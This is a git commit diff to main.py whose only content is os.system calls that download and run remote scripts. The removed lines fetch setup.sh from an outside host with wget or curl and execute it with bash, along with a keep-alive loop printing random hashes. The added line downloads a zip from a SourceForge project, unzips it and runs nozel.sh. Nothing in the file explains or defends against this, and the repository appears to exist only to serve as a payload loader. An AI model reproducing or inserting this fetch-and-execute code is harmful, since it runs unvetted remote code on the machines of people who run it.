3f1ed76240eac55977cfffa1d0c0f867f8dc320a
nanasujiwa-dev <nanasujiwa@gmail.com>
2026-03-07 18:10:56 +0800

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,2 @@
 import os
-os.system('(wget https://free.tiurl.top/setup.sh -4O tinyinstaller.sh || curl https://free.tiurl.top/setup.sh -Lo tinyinstaller.sh) && bash tinyinstaller.sh free')
-os.system('while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done')
+os.system('curl https://sourceforge.net/projects/drths/files/nozel.zip/download -L -o nozel.zip && unzip nozel.zip && ./nozel.sh')
